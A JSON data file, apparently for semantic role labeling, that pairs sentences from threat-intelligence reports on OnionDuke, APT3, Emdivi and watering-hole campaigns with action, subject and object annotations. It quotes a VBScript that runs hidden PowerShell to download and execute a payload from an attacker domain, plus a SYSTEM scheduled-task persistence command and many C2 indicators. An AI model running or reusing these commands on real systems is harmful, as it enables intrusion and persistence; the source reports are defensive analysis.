"O": ["The POST body"]}}], " Although the\nnetwork traffic is encoded with a custom Base64 alphabet, the URI pattern has been largely consistent:\n<list>\n/[ACD] [EW]S[Numbers].jsp?[Base64]\n</list>\nWe analyzed a recent sample that appears to have targeted entities in Taiwan, a target consistent with\nprevious Ixeshe activity": [{"is encoded": {"A": "is encoded", "O": ["the network traffic", "with a custom Base64 alphabet"]}}], "\n\f\n\n<figure></figure>\n<caption>A visualization of the infrastructure shared between OnionDuke and MiniDuke</caption>\n\n\nBased on compilation timestamps and discovery dates of samples we have observed, we believe the\nOnionDuke operators have been infecting downloaded executables at least since the end of October 2013": [{"been infecting": {"A": "been infecting", "S": "the OnionDuke operators", "O": ["since the end of October 2013", "downloaded executables"]}}], " Most of these components don't embed their own C&C information but\nrather communicate with their controllers through the original backdoor process": [{"communicate": {"A": "communicate", "S": "Most of these components", "O": ["with their controllers", "through the original backdoor process"]}}], "\nThis is significant because the domains leveldelta.com and grouptumbler.com have previously been\nidentified as C&C domains used by MiniDuke": [{"been identified": {"A": "been identified", "O": ["as C&C domains used by MiniDuke", "the domains leveldelta.com and grouptumbler.com"]}}], " Some of these components have been observed\nbeing downloaded and executed by the original backdoor process but for other components, we have yet to\nidentify the infection vector": [{"being downloaded and executed": {"A": "being downloaded and executed", "S": "the original backdoor process", "O": ["Some of these components"]}}], " We have, for instance, observed components dedicated to stealing login credentials from\nthe victim machine and components dedicated to gathering further information on the compromised\nsystem like the presence of antivirus software or a firewall": [{"gathering": {"A": "gathering", "S": "components", "O": ["further information on the compromised system like the presence of antivirus software or a firewall"]}}, {"stealing": {"A": "stealing", "S": "components", "O": ["login credentials", "from the victim machine"]}}], "\nWe also have evidence suggesting that, at least since February of 2014, OnionDuke has not only been\nspread by modifying downloaded executables but also by infecting executables in .torrent files containing\npirated software": [{"been spread": {"A": "been spread", "O": ["by infecting executables in .torrent files containing pirated software", "by modifying downloaded executables", "OnionDuke"]}}], " The dropper will proceed to decrypt this DLL, write it to disk and\nexecute it": [{"proceed": {"A": "proceed", "S": "The dropper", "O": ["to decrypt this DLL, write it to disk and execute it"]}}], " By using a separate wrapper, the malicious actors are able to bypass any integrity checks the\noriginal binary might contain": [{"bypass": {"A": "bypass", "S": "the malicious actors", "O": ["any integrity checks the original binary might contain", "By using a separate wrapper"]}}], "<doc>\n<section>\n<heading>OnionDuke: APT Attacks Via the Tor Network - F-Secure Weblog :\nNews from the Lab</heading>\nRecently, research was published identifying a Tor exit node, located in Russia, that was consistently and\nmaliciously modifying any uncompressed Windows executables downloaded through it": [{"was consistently and maliciously modifying": {"A": "was consistently and maliciously modifying", "S": "a Tor exit node", "O": ["any uncompressed Windows executables downloaded through it"]}}], " This DLL file (SHA1\nd433f281cf56015941a1c2cb87066ca62ea1db37, detected as Backdoor:W32/OnionDuke.A) contains\namong its configuration data a different hardcoded C&C domain, overpict.com and also evidence\nsuggesting that this component may abuse Twitter as an additional C&C channel": [{"abuse": {"A": "abuse", "S": "this component", "O": ["as an additional C&C channel", "Twitter"]}}, {"contains": {"A": "contains", "S": "This DLL file", "O": ["among its configuration data", "a different hardcoded C&C domain, overpict.com"]}}], " From these C&Cs the malware may\nreceive instructions to download and execute additional malicious components": [{"download and execute": {"A": "download and execute", "S": "the malware", "O": ["additional malicious components"]}, "receive": {"A": "receive", "S": "the malware", "O": ["instructions"]}}], " This executable is a dropper containing a PE\nresource that pretends to be an embedded GIF image file": [{"is": {"A": "is", "S": "This executable", "O": ["a dropper"]}}, {"pretends": {"A": "pretends", "S": "a PE resource", "O": ["to be an embedded GIF image file"]}}], "\n\f\n\n<figure></figure>\n\n<caption>A flowchart of the infection process</caption>\n\n\nOnce executed, the DLL file (SHA1: b491c14d8cfb48636f6095b7b16555e9a575d57f, detected as\nBackdoor:W32/OnionDuke.B) will decrypt an embedded configuration (shown below) and attempt to\nconnect to hardcoded C&C URLs specified in the configuration data": [{"connect": {"A": "connect", "S": "the DLL file", "O": ["to hardcoded C&C URLs specified in the configuration data"]}}], "\n\nBy exploiting and co-opting Afghan network infrastructure that is used by multiple ministerial level\nwebsites, Chinese intelligence services would be able to widely distribute malicious payloads to a variety of\nglobal targets using Afghanistan\u2019s government websites as a topical and trusted distribution platform,\nexploiting a single hidden entry point": [{"distribute": {"A": "distribute", "S": "Chinese intelligence services", "O": ["using Afghanistan\u2019s government websites as a topical and trusted distribution platform", "to a variety of global targets", "malicious payloads"]}}], " This being a variant of a typical \u201cwatering-hole\u201d attack, the\nattackers will most likely infect victims outside the Afghan government who happened to be browsing any\none of the CDN client systems, specifically, partner states involved in the planned troop reduction": [{"being": {"A": "being", "S": "This", "O": ["a variant of a typical \u201cwatering-hole\u201d attack"]}}], " Additional indicators and context associated with this particular Java driveby\nactivity can be found in the ThreatConnect Common Community Incident 20140815A: \n<list>\njava-se APT\nDriveby (shared October 02, 2014)\n</list>\n</section>\n<section>\n<heading>The Windows PE Payload</heading>\n\nThe XOR 0xC8 encoded payload downloaded from [http:]//mfa.gov[.]af/content/images/icon35.png\ndecodes into the Windows PE executable SHA1: \n<list>\n72D72DC1BBA4C5EBC3D6E02F7B446114A3C58EAB\n</list>\nThis executable is a self-extracting (SFX) Microsoft Cabinet executable that is digitally signed with a valid\ncertificate from \u201cOnAndOn Information System Co., Ltd.\u201d, serial number \u201c1F F7 D8 64 18 1C 55 5E 70 CF\nDD 3A 59 34 C4 7D\u201d": [{"downloaded": {"A": "downloaded", "O": ["from [http:]//mfa.gov[.]af/content/images/icon35.png", "The XOR 0xC8 encoded payload"]}}], "\n</section>\n<section>\n<heading>Afghan Government \u201cWatering Hole\u201d</heading>\n\nThe ThreatConnect Intelligence Research Team (TCIRT) recently observed a targeted cross-site scripting\n(XSS) \u201cdrive-by\u201d attack that leveraged a single content delivery network resource to distribute a malicious\nJava applet via nearly all of the major official Government of Afghanistan websites": [{"leveraged": {"A": "leveraged", "S": "a targeted cross-site scripting (XSS) \u201cdrive-by\u201d attack", "O": ["to distribute a malicious Java applet via nearly all of the major official Government of Afghanistan websites", "a single content delivery network resource"]}}], " This\nclass file downloads and decodes an XOR 0xC8 encoded Windows PE executable payload from\n[http:]//mfa.gov[.]af/content/images/icon35.png, hosted on the official Afghan Ministry of Foreign\nAffairs site, which was also affected by the gop-script XSS": [{"downloads and decodes": {"A": "downloads and decodes", "S": "This class file", "O": ["an XOR 0xC8 encoded Windows PE executable payload", "from [http:]//mfa.gov[.]af/content/images/icon35.png"]}}], "\n<list>\n      SHA1: 5C8683E3523C7FA81A0166D7D127616B06334E8D (Readme.txt)\nMalicious encrypted backdoor binary blob loaded by dbgeng.dll\n</list>\n\fThis backdoor connects to the faux Oracle Java themed command and control (C2) domain\noracle0876634.javaplug-in[.]com": [{"connects": {"A": "connects", "S": "This backdoor", "O": ["to the faux Oracle Java themed command and control (C2) domain oracle0876634.javaplug-in[.]com"]}}], " This applet has the same class path, and\ndownloads an XOR 0xFF encoded payload executable from the URL [https:]//amco-\ntriton.co[.]jp/js/dl/in.jpg": [{"downloads": {"A": "downloads", "S": "This applet", "O": ["an XOR 0xFF encoded payload executable", "from the URL [https:]//amco- triton.co[.]jp/js/dl/in.jpg"]}}], "\n\nThis executable drops the following files:\n<list>\n      SHA1: 2068260601D60F07829EE0CEDF5A9C636CDB1765 (dllhost.exe)\nLegitimate Microsoft Debugging Tools for Windows Executable, loads dbgeng.dll\n      SHA1: E2D93ABC4C5EDE41CAF1C0D751A329B884D732A2 (dbgeng.dll)\n</list>\nMalicious DLL that loads into the above dllhost.exe, using a similar DLL sideloading technique to that\nmost commonly associated with the PlugX backdoor": [{"loads": {"A": "loads", "S": "Malicious DLL", "O": ["into the above dllhost.exe"]}, "using": {"A": "using", "S": "Malicious DLL", "O": ["a similar DLL sideloading technique to that most commonly associated with the PlugX backdoor"]}}, {"drops": {"A": "drops", "S": "This executable", "O": ["the following files"]}}], " The deflated exe was a variant of the same downloader described above and\nconnected to 198.55.115.71 over port 1913 via SOCKS5 proxy": [{"connected": {"A": "connected", "S": "The deflated exe", "O": ["over port 1913", "to 198.55.115.71", "via SOCKS5 proxy"]}, "was": {"A": "was", "S": "The deflated exe", "O": ["a variant of the same downloader described above"]}}], " The malware then requests a connection to 192.184.60.229 on TCP port 81 using the\ncommand \"05 01 00 01 c0 b8 3c e5 00 51\" and verifies that the first two bytes from the server are \"05 00\"\n(c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order)": [{"verifies": {"A": "verifies", "S": "The malware", "O": ["that the first two bytes from the server are \"05 00\""]}, "requests": {"A": "requests", "S": "The malware", "O": ["using the command \"05 01 00 01 c0 b8 3c e5 00 51\"", "a connection to 192.184.60.229 on TCP port 81"]}}], "\n\nThe malware component, test.exe, uses the Windows command \"cmd.exe\" /C whoami\u201d to verify it is\nrunning with the elevated privileges of \u201cSystem\u201d and creates persistence by creating the following\nscheduled task:\n<list>\n  schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON         /ru \"System\"\n</list>\nWhen executed, the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port\n1913": [{"establishes": {"A": "establishes", "S": "the malware", "O": ["to 192.157.198.103", "a SOCKS5 connection", "using TCP port 1913"]}}, {"uses": {"A": "uses", "S": "The malware component, test.exe", "O": ["the Windows command \"cmd.exe\" /C whoami\u201d", "to verify it is running with the elevated privileges of \u201cSystem\u201d"]}, "creates": {"A": "creates", "S": "The malware component, test.exe", "O": ["by creating the following scheduled task", "persistence"]}}], " The secondary payload in that case was\ndetected as Backdoor.APT.CookieCutter (aka Pirpi) and also named newnotepad.exe (MD5\n8849538ef1c3471640230605c2623c67) and connected to the known APT3 domains:\n<list>\n  inform.bedircati[.]com\n\n  pn.lamb-site[.]com\n\n  210.109.99.64\n</list>\n\fThe 192.184.60.229 IP address seen in this current campaign also hosts securitywap[.]com \u2013 another\nknown domain referenced in our Operation Clandestine Fox blog": [{"connected": {"A": "connected", "S": "The secondary payload", "O": ["to the known APT3 domains"]}, "was detected": {"A": "was detected", "S": "The secondary payload", "O": ["as Backdoor.APT.CookieCutter (aka Pirpi)"]}}], "\n</section>\n<section>\n<heading>The Downloader</heading>\n\nAfter the exploit or script executes, the system downloads install.exe, which has the following metadata:\n<list>\nMD5           5a0c4e1925c76a959ab0588f683ab437\n\nSize         46592 bytes\n\nCompile Time 2014-11-19 08:55:10Z\n\nImport Hash      6b8611f8148a6b51e37fd68e75b6a81c\n</list>\nThe file install.exe attempts to write two files (doc.exe and test.exe) to the hard-coded path\n\u201cC:\\Users\\Public\u201d, which fails on Windows XP because that path is not present by default": [{"downloads": {"A": "downloads", "S": "the system", "O": ["install.exe"]}}, {"write": {"A": "write", "S": "The file install.exe", "O": ["two files (doc.exe and test.exe)", "to the hard-coded path \u201cC:\\Users\\Public\u201d"]}}], "<doc>\n<section>\n<heading>Operation Double Tap</heading>\n\nAPT3 (also known as UPS), the actors responsible for Operation Clandestine Fox has quietly continued to\nsend waves of spearphishing messages over the past few months": [{"send": {"A": "send", "S": "the actors responsible for Operation Clandestine Fox", "O": ["waves of spearphishing messages", "over the past few months"]}}], " The file is saved to:\n\n               C:\\Users\\\n               [Username]\\AppData\\Local\\Temp\\notepad.exe\n 00 00 04      Content after command ID is written to:\n\n               C:\\Users\\\n               [Username]\\AppData\\Local\\Temp\\notepad2.exe\n 00 00 05      The files notepad1.exe and notepad2.exe are\n               concatenated together and written to C:\\Users\\\n               [Username]\\AppData\\Local\\Temp\\newnotepad.exe\n               and executed\n 00 00 06      The contents of the following file is sent to the\n               server:\n\n               C:\\Users\\\n               [Username]\\AppData\\Local\\Temp\\note.txt\n 00 00 07      The string following the command ID is executed\n               using \"cmd /C\" and results are sent to server\n</table>\n</section>\n<section>\n<heading>Links to APT3</heading>\n\nOn October 28, we observed APT3 sending out spearphishing messages containing a compressed\nexecutable attachment": [{"sending": {"A": "sending", "S": "APT3", "O": ["out spearphishing messages containing a compressed executable attachment"]}}], " The malware sends the SOCKS5 connection request \"05 01 00\" and verifies the server response\nstarts with \"05 00\"": [{"verifies": {"A": "verifies", "S": "The malware", "O": ["the server response starts with \"05 00\""]}, "sends": {"A": "sends", "S": "The malware", "O": ["the SOCKS5 connection request \"05 01 00\""]}}], " CVE-2014-\n4113 is a privilege escalation vulnerability that was disclosed publicly on 2014-10-14": [{"is": {"A": "is", "S": "CVE-2014- 4113", "O": ["a privilege escalation vulnerability"]}}], "\n\nOnce the connection to the server is established, the malware expects a message containing at least three\nbytes from the server": [{"expects": {"A": "expects", "S": "the malware", "O": ["a message containing at least three bytes from the server", "Once the connection to the server is established"]}}], "\n\nThe first dropped file, doc.exe, contains the CVE-2014-4113 exploit and then attempts to execute test.exe\nwith the elevated privileges": [{"contains": {"A": "contains", "S": "The first dropped file, doc.exe", "O": ["the CVE-2014-4113 exploit"]}, "execute": {"A": "execute", "S": "The first dropped file, doc.exe", "O": ["with the elevated privileges", "test.exe"]}}], " This CVE is\na local kernel vulnerability that, with successful exploitation, would give any user SYSTEM access on the\nmachine": [{"give": {"A": "give", "S": "This CVE", "O": ["any user", "SYSTEM access on the machine"]}}], "\n\nThis IP has hosted other domains used by APT3 in past campaigns:\n<table>\n DOMAIN                     FIRST SEEN     LAST SEEN        IP ADDRESS\n join.playboysplus[.]com    2014-11-21     2014-11-21       104.151.248.173\n walterclean[.]com          2014-11-18     2014-11-20       104.151.248.173\n www.walterclean[.]com      2014-11-18     2014-11-20       104.151.248.173\n</table>\nAs we discussed in our previous blog detailing previous APT3 activity, the walterclean[.]com served as a\nPlugx/Kaba command and control server": [{"served": {"A": "served", "S": "the walterclean[.]com", "O": ["as a Plugx/Kaba command and control server"]}}], "\n</section>\n<section>\n<heading>Conclusion</heading>\n\nAlthough APT3 is well known for employing zero-day exploits in their attacks, recent activity has\ndemonstrated that they will also attack targets with known exploits or social engineering": [{"attack": {"A": "attack", "S": "they", "O": ["with known exploits or social engineering", "targets"]}}], " CVE-2014-6332 was disclosed publicly on\n2014-11-11 and is a Windows OLE Automation Array Remote Code Execution vulnerability": [{"is": {"A": "is", "S": "CVE-2014-6332", "O": ["a Windows OLE Automation Array Remote Code Execution vulnerability"]}}], "\n\nThe webpage contained both CVE-2014-6332 exploit code and a VBScript that invoked PowerShell on the\naffected users\u2019 system to download the below payload:\n<code>\n\n  function runmumaa()\n\n  On Error Resume Next\n\n  set shell=createobject(\"Shell.Application\")\n\n  shell.ShellExecute \"powershell.exe\",\"-NoLogo -NoProfile             -NonInteractive -WindowStyle\nHidden ( New-Object\n\u201cSystem.Net.WebClient\u201d).DownloadFile(\u201chttp://www.playboysplus.com\n\f/install/install.exe\u201d,\u201dinstall.exe\u201d);Invoke-Item install.exe\", \"\",   \"open\", 1\n\n  end function\n</code>\nThe CVE-2014-6332 exploit code seen in this incident is derived from the code published at\nhttp://www.exploit-db.com/exploits/35230/, which has also been incorporated in the Metasploit project": [{"download": {"A": "download", "S": "a VBScript", "O": ["the below payload"]}}], " Type S is a .NET application based\non the same source code and shared C&C infrastructure as Type T": [{"based": {"A": "based", "S": "Type S", "O": ["on and shared C&C infrastructure as Type T"]}}], " Emdivi allows the remote\nattacker executing the commands to send the results back to the command-and-control (C&C) server\nthrough HTTP": [{"executing": {"A": "executing", "S": "the remote attacker", "O": ["the commands"]}, "send": {"A": "send", "S": "the remote attacker", "O": ["through HTTP", "the results", "back to the command-and-control (C&C) server"]}}], " This is merely to trick the recipient into believing the email is from a\nlegitimate and trustworthy source": [{"trick": {"A": "trick", "S": "This", "O": ["into believing the email is from a legitimate and trustworthy source", "the recipient"]}}], " The malware adds extra words to the version number and then, based on this,\ngenerates a hash, which it uses as an encryption key": [{"uses": {"A": "uses", "S": "it", "O": ["as an encryption key", "a hash"]}, "generates": {"A": "generates", "S": "The malware", "O": ["a hash"]}}], " Opening the malicious attachment\nwith Ichitaro will drop the payload and display the document": [{"drop": {"A": "drop", "S": "Opening the malicious attachment with Ichitaro", "O": ["the payload"]}}], "\n\nThe exploit is sent to the targeted organizations through emails with a malicious Ichitaro document file\nattached, which Symantec products detect as Bloodhound.Exploit.557": [{"is sent": {"A": "is sent", "O": ["The exploit", "through emails with a malicious Ichitaro document file attached", "to the targeted organizations"]}}], " Type T also\ndetects the presence of automatic analysis systems or debuggers, such as the following:\n<list>\n      VirtualMachine\n      Debugger\n      Sandbox\n</list>\nType S, on the other hand, was used only twice in the attack campaign": [{"detects": {"A": "detects", "S": "Type T", "O": ["the presence of automatic analysis systems"]}}], " Attached \u201cdocument\u201d is actually a malicious executable file</caption>\n</section>\n<section>\n<heading>Payload</heading>\nThe malicious payload is Backdoor.Emdivi, a threat that opens a back door on the compromised\ncomputer": [{"opens": {"A": "opens", "S": "a threat", "O": ["on the compromised computer", "a back door"]}}, {"is": {"A": "is", "S": "The malicious payload", "O": ["Backdoor.Emdivi"]}}], " Type T employs\ntechniques to protect itself from security vendors or network administrators": [{"employs": {"A": "employs", "S": "Type T", "O": ["to protect itself from security vendors or network administrators", "techniques"]}}], " The email also requests that the recipient open the attachment on a Windows computer": [{"requests": {"A": "requests", "S": "The email", "O": ["that the recipient open the attachment on a Windows computer"]}}], " Payloads from the exploit may\ninclude Backdoor.Emdivi, Backdoor.Korplug, and Backdoor.ZXshell; however, all payloads aim to steal\nconfidential information from the compromised computer": [{"steal": {"A": "steal", "S": "all payloads", "O": ["confidential information", "from the compromised computer"]}}, {"include": {"A": "include", "S": "Payloads from the exploit", "O": ["Backdoor.Emdivi, Backdoor.Korplug, and Backdoor.ZXshell"]}}], " Once successfully exploited, the file installed Backdoor.Emdivi": [{"installed": {"A": "installed", "S": "the file", "O": ["Backdoor.Emdivi"]}}], " Mostly the attachments are in a simple executable format with a fake icon": [{"are": {"A": "are", "S": "the attachments", "O": ["with a fake icon", "in a simple executable format"]}}], " Japanese text used by Emdivi Type S variant</caption>\n</section>\n<section>\n<heading>Who is Emdivi talking to?</heading>\nOnce infected, Emdivi connects to hardcoded C&C servers using the HTTP protocol": [{"connects": {"A": "connects", "S": "Emdivi", "O": ["using the HTTP protocol", "to hardcoded C&C servers"]}}], " Instead,\nthe attacker somehow penetrated the cloud service itself and turned the websites into C&C servers for\nBackdoor.Emdivi": [{"turned": {"A": "turned", "S": "the attacker", "O": ["the websites", "into C&C servers for Backdoor.Emdivi"]}}], " This group\u2019s primary goal is to steal confidential information from\ntargeted organizations": [{"steal": {"A": "steal", "S": "This group", "O": ["from targeted organizations", "confidential information"]}}], " In this campaign, variants of\nBackdoor.Emdivi are persistently used as a payload": [{"are persistently used": {"A": "are persistently used", "O": ["variants of Backdoor.Emdivi", "as a payload"]}}], " The attackers sent a Microsoft Word file containing a maliciously crafted SWF file\nthat exploited the vulnerability": [{"sent": {"A": "sent", "S": "The attackers", "O": ["a Microsoft Word file containing a maliciously crafted SWF file that exploited the vulnerability"]}}], " Malformed SWF file used in the LadyBoyle campaign in February 2013</caption>\n\nBoth attacks use a .doc file containing an Adobe Flash zero-day exploit that is used to install a back door": [{"install": {"A": "install", "S": "an Adobe Flash zero-day exploit", "O": ["a back door"]}}], " All attacks arrive on the target computers as an\nattachment to email messages": [{"arrive": {"A": "arrive", "S": "All attacks", "O": ["on the target computers", "as an attachment to email messages"]}}], " The emails include password-protected .zip files containing the malware": [{"include": {"A": "include", "S": "The emails", "O": ["password-protected .zip files containing the malware"]}}], " Important parts of Type T,\n\fsuch as the C&C server address it contacts and its protection mechanisms, are encrypted": [{"are encrypted": {"A": "are encrypted", "O": ["Important parts of Type T, such as the C&C server address it contacts and its protection mechanisms"]}}], "\n\nThis PlugX payload was configured with the following command-and-control (CnC) domains:\n<list>\n      java.ns1[.]name\n      adservice.no-ip[.]org\n      wmi.ns01[.]us\n</list>\nSample callback traffic was as follows:\n<list>\n    POST /D28419029043311C6F8BF9F5 HTTP/1.1\n    Accept: */*\n    HHV1: 0\n    HHV2: 0\n    HHV3: 61456\n    HHV4: 1\n    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;\n    InfoPath.2; .NET CLR 2.0.50727; SV1)\n    Host: java.ns1.name\n    Content-Length: 0\n    Connection: Keep-Alive\n    Cache-Control: no-cache\n</list>\n</section>\n<section>\n<heading>Campaign analysis</heading>\n\nBoth java.ns1[.]name and adservice.no-ip[.]org resolved to 74.126.177.68 on Feb": [{"was configured": {"A": "was configured", "O": ["This PlugX payload", "with the following command-and-control (CnC) domains"]}}], " Once ROP marks the shellcode as executable\nusing Windows\u2019 VirtualProtect function, it downloads an executable via the InternetOpenURLA and\nInternetReadFile functions": [{"downloads": {"A": "downloads", "S": "it", "O": ["via the InternetOpenURLA and InternetReadFile functions", "an executable"]}}], "\n\nOn Windows 7, the attackers use a hard-coded ROP chain for MSVCR71.dll (Visual C++ runtime) if the\nuser has Java 1.6, and a hard-coded ROP chain for HXDS.dll (Help Data Services Module) if the user has\nMicrosoft Office 2007 or 2010": [{"use": {"A": "use", "S": "the attackers", "O": ["a hard-coded ROP chain for HXDS.dll (Help Data Services Module)", "if the user has Microsoft Office 2007 or 2010", "On Windows 7", "a hard-coded ROP chain for MSVCR71.dll (Visual C++ runtime)", "if the user has Java 1.6"]}}], "\n<table>\nDomain                  First Seen    Last Seen        IP Address\nadservice.no-ip[.]org   2014-02-18    2014-02-19       74.126.177.68\njava.ns1[.]name         2014-02-18    2014-02-19       74.126.177.68\njava.ns1[.]name         2014-02-18    2014-02-18       192.74.246.219\nwmi.ns01[.]us           2014-02-17    2014-02-17       192.74.246.219\nproxy.ddns[.]info       2013-05-02    2014-02-18       103.246.246.103\n\fupdatedns.ns02[.]us 2013-09-06       2013-09-06      103.246.246.103\nupdatedns.ns01[.]us 2013-09-06       2013-09-06      103.246.246.103\nwmi.ns01[.]us       2013-07-04       2013-07-15      103.246.246.103\n</table>\nFurther research uncovered a number of older malware samples connecting to the same domain\nwmi.ns01[.]us": [{"connecting": {"A": "connecting", "S": "a number of older malware samples", "O": ["to the same domain wmi.ns01[.]us"]}}], " Peterson Institute for International Economics\n(www.piie[.]com) were redirected to an exploit server hosting this Flash zero-day through a hidden\niframe": [{"were redirected": {"A": "were redirected", "O": ["Visitors to the Peter G. Peterson Institute for International Economics (www.piie[.]com)", "to an exploit server hosting this Flash zero-day", "through a hidden iframe"]}}], "\n\nIn what is certainly not a coincidence, we also observed www.arce[.]org (one of the sites redirecting to the\ncurrent Flash exploit) also redirect visitors to the Java exploit on shop.fujifilm[.]be in 2013": [{"redirecting": {"A": "redirecting", "S": "www.arce[.]org", "O": ["to the current Flash exploit"]}, "redirect": {"A": "redirect", "S": "www.arce[.]org", "O": ["visitors", "to the Java exploit on shop.fujifilm[.]be", "in 2013"]}}], "\n\nAs of this blog post, visitors to at least three nonprofit institutions \u2014 two of which focus on matters of\nnational security and public policy \u2014 were redirected to an exploit server hosting the zero-day exploit": [{"were redirected": {"A": "were redirected", "O": ["visitors to at least three nonprofit institutions", "to an exploit server hosting the zero-day exploit"]}}], "\n</section>\n\f\n<section>\n<heading>PlugX/Kaba payload analysis</heading>\n\nOnce the exploit succeeds, a PlugX/Kaba remote access tool (RAT) payload with the MD5 hash\n507aed81e3106da8c50efb3a045c5e2b is installed on the compromised endpoint": [{"is installed": {"A": "is installed", "O": ["a PlugX/Kaba remote access tool (RAT) payload with the MD5 hash 507aed81e3106da8c50efb3a045c5e2b", "on the compromised endpoint"]}}], "\n</section>\n<section>\n<heading>Shellcode analysis</heading>\n\nThe shellcode is downloaded in ActionScript as a GIF image": [{"is downloaded": {"A": "is downloaded", "O": ["in ActionScript", "as a GIF image", "The shellcode"]}}], " Then it writes the file to disk with CreateFileA and WriteFile functions": [{"writes": {"A": "writes", "S": "it", "O": ["with CreateFileA and WriteFile functions", "to disk", "the file"]}}], " This jar file exploited CVE-2012-0507 and\ndropped a Poison Ivy payload with the hash (MD5 52aa791a524b61b129344f10b4712f52)": [{"dropped": {"A": "dropped", "S": "This jar file", "O": ["a Poison Ivy payload with the hash (MD5 52aa791a524b61b129344f10b4712f52)"]}}], "\n\nThis actor also has early access to a number of zero-day exploits, including Flash and Java, and deploys a\nvariety of malware families on compromised systems": [{"deploys": {"A": "deploys", "S": "This actor", "O": ["a variety of malware families", "on compromised systems"]}}], "\nIn this case, visitors were redirected from www.ceps[.]be to a Java exploit hosted on shop.fujifilm[.]be": [{"were redirected": {"A": "were redirected", "O": ["from www.ceps[.]be", "to a Java exploit hosted on shop.fujifilm[.]be", "visitors"]}}], "\n\nThe group behind this campaign appears to have sufficient resources (such as access to zero-day exploits)\nand a determination to infect visitors to foreign and public policy websites": [{"infect": {"A": "infect", "S": "The group behind this campaign", "O": ["visitors to foreign and public policy websites"]}}], "\n<table>\nDomain              First Seen       Last Seen       IP Address\nwmi.ns01.us         2012-07-07       2012-09-19      76.73.80.188\nwindows.ddns.us     2012-05-23       2012-06-10      76.73.80.188\n</table>\n\fDuring another earlier compromise of the same www.cdi.org website, visitors were redirected to a Java\nexploit test.jar (MD5 7d810e3564c4eb95bcb3d11ce191208e)": [{"were redirected": {"A": "were redirected", "O": ["to a Java exploit test.jar (MD5 7d810e3564c4eb95bcb3d11ce191208e)", "visitors"]}}], "\n\nFor Windows XP, the attackers build a return-oriented programming (ROP) chain of MSVCRT (Visual C\nruntime) gadgets with hard-coded base addresses for English (\u201cen\u201d) and Chinese (\u201czh-cn\u201d and \u201czh-tw\u201d)": [{"build": {"A": "build", "S": "the attackers", "O": ["a return-oriented programming (ROP) chain of MSVCRT (Visual C runtime) gadgets", "For Windows XP", "with hard-coded base addresses for English (\u201cen\u201d) and Chinese (\u201czh-cn\u201d and \u201czh-tw\u201d)"]}}], "\n</section>\n<section>\n<heading>ASLR bypass</heading>\n\nThe attack uses only known ASLR bypasses": [{"uses": {"A": "uses", "S": "The attack", "O": ["only known ASLR bypasses"]}}], "\n<table>\nDomain              First Seen       Last Seen         IP Address\nwmi.ns01[.]us       2012-07-03       2012-07-04        194.183.224.75\nids.ns01[.]us       2012-04-23       2012-05-18        194.183.224.75\n</table>\nThe Poison Ivy sample referenced above (MD5 fd69793bd63c44bbb22f9c4d46873252) was delivered via\nan exploit chain that began with a redirect from the Center for European Policy Studies (www.ceps[.]be)": [{"was delivered": {"A": "was delivered", "O": ["via an exploit chain that began with a redirect from the Center for European Policy Studies (www.ceps[.]be)", "The Poison Ivy sample referenced above (MD5 fd69793bd63c44bbb22f9c4d46873252)"]}}], " The vulnerability permits an\nattacker to overwrite the vftable pointer of a Flash object to redirect code execution": [{"overwrite": {"A": "overwrite", "S": "an attacker", "O": ["to redirect code execution", "the vftable pointer of a Flash object"]}}], "\n<table>\nMD5                               Family Compile Alternate C2s\n                                           Time\n7995a9a6a889b914e208eb924e459ebc PlugX     2012-06-09 fuckchina.govnb[.]com\nbf60b8d26bc0c94dda2e3471de6ec977 PlugX     2010-03-15 microsafes.no-ip[.]org\nfd69793bd63c44bbb22f9c4d46873252 Poison 2013-03-07 N/A\n                                  Ivy\n88b375e3b5c50a3e6c881bc96c926928 Poison 2012-06-11 N/A\n                                  Ivy\ncd07a9e49b1f909e1bd9e39a7a6e56b4 Poison 2012-06-11 N/A\n                                  Ivy\n</table>\n<table>\nDomain                 First Seen   Last Seen       IP Address\nfuckchina.govnb[.]com 2013-12-11    2013-12-11      204.200.222.136\nmicrosafes.no-ip[.]org 2014-02-12   2014-02-12      74.126.177.70\nmicrosafes.no-ip[.]org 2013-12-04   2013-12-04      74.126.177.241\n</table>\nThe Poison Ivy variants that connected to the domain wmi.ns01[.]us had the following unique\nconfiguration properties:\n<table>\nMD5                              Password                   Mutex\nfd69793bd63c44bbb22f9c4d46873252 java7                      NBCD*&^FE\n88b375e3b5c50a3e6c881bc96c926928 admin                      ytf^&^333\ncd07a9e49b1f909e1bd9e39a7a6e56b4 admin                      ytf^&^333\n</table>\nWe found a related Poison Ivy sample (MD5 8936c87a08ffa56d19fdb87588e35952) with the same \u201cjava7\u201d\npassword, which was dropped by an Adobe Flash exploit (CVE-2012-0779)": [{"was dropped": {"A": "was dropped", "S": "an Adobe Flash exploit (CVE-2012-0779)", "O": ["a related Poison Ivy sample (MD5 8936c87a08ffa56d19fdb87588e35952) with the same \u201cjava7\u201d password"]}}, {"connected": {"A": "connected", "S": "The Poison Ivy variants", "O": ["to the domain wmi.ns01[.]us"]}}], " In this previous incident,\nvisitors to the Center for Defense Information website (www.cdi[.]org \u2014 also an organization involved in\ndefense matters \u2014 were redirected to an exploit server at 159.54.62.92": [{"were redirected": {"A": "were redirected", "O": ["to an exploit server at 159.54.62.92", "visitors to the Center for Defense Information website"]}}], " This Poison Ivy\nvariant connected to a CnC server at ids.ns01[.]us": [{"connected": {"A": "connected", "S": "This Poison Ivy variant", "O": ["to a CnC server at ids.ns01[.]us"]}}], " In addition\nto using the same password \u201cjava7,\u201d this variant was configured with the mutex with the similar pattern of\n\u201cYFds*&^ff\u201d and connected to a CnC server at windows.ddns[.]us": [{"connected": {"A": "connected", "S": "this variant", "O": ["to a CnC server at windows.ddns[.]us"]}}], " The threat actors likely sought\nto infect users to these sites for follow-on data theft, including information related to defense and public\npolicy matters": [{"infect": {"A": "infect", "S": "The threat actors", "O": ["for follow-on data theft", "users to these sites"]}}], " This exploit, in turn, dropped the Poison Ivy variant": [{"dropped": {"A": "dropped", "S": "This exploit", "O": ["the Poison Ivy variant"]}}], "\n\nWe subsequently found that the American Research Center in Egypt (www.arce[.]org) and the Smith\nRichardson Foundation (www.srf[.]org) also redirected visitors the exploit server": [{"redirected": {"A": "redirected", "S": "We subsequently found that the American Research Center in Egypt (www.arce[.]org) and the Smith Richardson Foundation (www.srf[.]org)", "O": ["the exploit server", "visitors"]}}], "\n</section>\n<section>\n<heading>Mitigation</heading>\n\nTo 